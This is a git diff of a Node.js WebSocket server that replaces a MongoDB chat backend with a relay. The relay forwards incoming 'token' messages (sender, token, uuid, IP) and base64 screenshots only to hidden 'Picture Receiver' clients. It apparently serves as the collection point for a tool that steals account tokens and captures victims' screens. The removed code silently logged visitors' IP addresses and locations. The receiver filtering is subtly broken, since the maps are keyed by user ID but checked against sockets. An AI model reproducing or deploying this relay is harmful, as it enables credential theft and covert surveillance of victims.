@@ -1,157 +1,136 @@
 import http from 'http';
 import express from 'express';
-import { WebSocketServer } from 'ws';
-import { MongoClient } from 'mongodb';
+import { WebSocket, WebSocketServer } from 'ws';
 import crypto from 'crypto';
-import fetch from 'node-fetch';
-import geoip from 'geoip-lite';
-import UAParser from 'ua-parser-js';
-import path from 'path';
-import { fileURLToPath } from 'url';
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
 
 const app = express();
-const server = http.createServer(app);
-const wss = new WebSocketServer({ server });
-
+app.use(express.static("public"));
 const PORT = process.env.PORT || 3000;
-const MONGODB_URI = process.env.MONGODB_URI;
+const server = http.createServer(app);
+const wss = new WebSocketServer({ noServer: true });
 
-let db;
-let messagesCollection;
-let clientsCollection;
-
-async function connectToMongoDB() {
-  try {
-    const client = await MongoClient.connect(MONGODB_URI);
-    db = client.db();
-    messagesCollection = db.collection('messages');
-    clientsCollection = db.collection('clients');
-    console.log('Connected to MongoDB');
-  } catch (error) {
-    console.error('Failed to connect to MongoDB:', error);
-    process.exit(1);
-  }
-}
-
-app.use(express.static(path.join(__dirname, 'public')));
-
-app.get('/chat.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'chat.html'));
+server.on('upgrade', (request, socket, head) => {
+    wss.handleUpgrade(request, socket, head, ws => {
+        wss.emit('connection', ws, request);
+    });
 });
 
-app.get('/api/messages', async (req, res) => {
-  const limit = parseInt(req.query.limit) || 50;
-  const offset = parseInt(req.query.offset) || 0;
-  const messages = await messagesCollection.find().sort({ timestamp: -1 }).skip(offset).limit(limit).toArray();
-  res.json(messages);
+server.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
 });
 
 const usersInChat = new Map();
+const pictureReceivers = new Map();
 const messageReceivers = new Map();
+let keepAliveId = null;
 
-wss.on('connection', async (ws, req) => {
-  const userID = crypto.randomUUID();
-  usersInChat.set(userID, ws);
-
-  const clientInfo = await getClientInfo(req);
-  await clientsCollection.insertOne({ ...clientInfo, userID, connectedAt: new Date() });
-
-  ws.on('message', async (data) => {
-    await handleMessage(ws, data, userID);
-  });
-
-  ws.on('close', () => {
-    handleDisconnect(userID);
-  });
-
-  broadcastUserCount();
+wss.on("connection", (ws) => {
+    const userID = crypto.randomUUID();  
+    ws.on("message", (data) => {
+        handleMessage(ws, data, userID);
+    });
+    ws.on("close", () => {
+        handleDisconnect(userID);
+        ws.removeAllListeners(); 
+    });
+    if (wss.clients.size === 1 && !keepAliveId) {
+        keepServerAlive();
+    }
 });
 
-async function getClientInfo(req) {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const userAgent = req.headers['user-agent'];
-  const geo = geoip.lookup(ip);
-  const ua = UAParser(userAgent);
+wss.on("close", () => {
+    if (keepAliveId) {
+        clearInterval(keepAliveId);
+        keepAliveId = null;
+    }
+});
 
-  return {
-    ip,
-    country: geo ? geo.country : 'Unknown',
-    city: geo ? geo.city : 'Unknown',
-    browser: ua.browser.name,
-    os: ua.os.name,
-    device: ua.device.type || 'desktop'
-  };
-}
+app.get('/node-version', (req, res) => {
+    res.send(`Node.js version: ${process.version}`);
+});
 
-async function handleMessage(ws, data, userID) {
-  console.log('Received message:', data.toString());
-  
-  if (data.toString() === 'Message Receiver') {
-    messageReceivers.set(userID, ws);
-    ws.send(JSON.stringify({ type: 'userCount', count: usersInChat.size }));
-  } else {
-    try {
-      const messageData = JSON.parse(data.toString());
-      
-      if (messageData.type === 'chat') {
-        const newMessage = {
-          id: crypto.randomUUID(),
-          userId: userID,
-          content: messageData.message.content,
-          timestamp: new Date(messageData.message.timestamp)
-        };
-        
+const handleMessage = (ws, data, userID) => {
+    if (data.toString() === 'Message Receiver') {
+        messageReceivers.set(userID, ws);
+        console.log(`User ${userID} registered as Message Receiver`);
+    } else if (data instanceof Buffer) {
+        // Broadcast binary message to all Message Receivers
+        broadcastToMessageReceivers(data);
+    } else {
         try {
-          await messagesCollection.insertOne(newMessage);
-          console.log('Message saved to MongoDB:', newMessage);
-          
-          // Broadcast the message to all connected clients
-          broadcastToAll(JSON.stringify({ type: 'chat', message: newMessage }));
-        } catch (error) {
-          console.error('Error saving message to MongoDB:', error);
+            const messageData = JSON.parse(data.toString());
+            
+            if (messageData.command === 'Picture Receiver') {
+                pictureReceivers.set(userID, ws);
+            } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
+                // Broadcast token information only to picture receivers
+                broadcastToPictureReceivers(messageData);
+            } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
+                broadcastToPictureReceivers({
+                    type: 'screenshot',
+                    action: messageData.action,
+                    screen: messageData.screen,
+                    data: messageData.data
+                });
+            } else if (messageData.action === 'screenshot_result') {
+                broadcastToPictureReceivers({
+                    type: 'screenshot',
+                    action: messageData.action,
+                    screen: messageData.screen,
+                    data: messageData.data
+                });
+            } else {
+                broadcastToAllExceptSpecialReceivers(ws, JSON.stringify(messageData), true);
+            }
+        } catch (e) {
+            console.error('Error parsing or processing message:', e);
+            console.error('Raw message data:', data);
         }
-      } else {
-        broadcastToAll(JSON.stringify(messageData));
-      }
-    } catch (e) {
-      console.error('Error parsing or processing message:', e);
     }
-  }
-}
+};
 
-function broadcastToAll(message) {
-  wss.clients.forEach(client => {
-    if (client.readyState === 1) {
-      client.send(message);
-    }
-  });
-}
+const broadcastToMessageReceivers = (binaryData) => {
+    messageReceivers.forEach((ws, userId) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(binaryData, { binary: true }, error => {
+                if (error) console.error("Error sending binary message to receiver:", error);
+            });
+        }
+    });
+};
 
-function handleDisconnect(userID) {
-  usersInChat.delete(userID);
-  messageReceivers.delete(userID);
-  clientsCollection.updateOne({ userID }, { $set: { disconnectedAt: new Date() } });
-  broadcastUserCount();
-}
+const broadcastToPictureReceivers = (message) => {
+    const data = JSON.stringify(message);
+    pictureReceivers.forEach((ws, userId) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(data, error => {
+                if (error) console.error("Error sending message to picture receiver:", error);
+            });
+        }
+    });
+};
 
-function broadcastUserCount() {
-  const userCount = usersInChat.size;
-  const message = JSON.stringify({ type: 'userCount', count: userCount });
-  wss.clients.forEach(client => {
-    if (client.readyState === 1) {
-      client.send(message);
-    }
-  });
-}
+const broadcastToAllExceptSpecialReceivers = (senderWs, message, includeSelf) => {
+    wss.clients.forEach(client => {
+        if (!pictureReceivers.has(client) && !messageReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
+            client.send(message);
+        }
+    });
+};
 
-async function startServer() {
-  await connectToMongoDB();
-  server.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
-  });
-}
+const handleDisconnect = (userID) => {
+    usersInChat.delete(userID);
+    pictureReceivers.delete(userID);
+    messageReceivers.delete(userID);
+    console.log(`User ${userID} disconnected`);
+};
 
-startServer();
+const keepServerAlive = () => {
+    keepAliveId = setInterval(() => {
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.ping(); 
+            }
+        });
+    }, 30000);
+};
